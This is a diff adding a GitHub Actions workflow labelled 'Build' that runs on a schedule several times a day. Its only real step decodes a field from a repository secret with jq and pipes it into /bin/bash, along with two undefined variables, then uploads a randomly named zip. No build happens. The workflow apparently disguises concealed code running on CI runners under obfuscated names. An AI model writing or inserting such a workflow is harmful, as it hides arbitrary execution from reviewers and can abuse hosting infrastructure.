@@ -1,0 +1,33 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '59 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          i46: ${{ secrets.i46 }}
+        run: |
+          printf '%s' "$i46" | jq -r .ykdv904 | /bin/bash
+          echo $nzr611 | jq -r .edpm04 | /bin/bash
+          echo $svyk30 | jq -r .hgk489 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: sBr7vkeE
+          path: "*.zip"
+          retention-days: 1
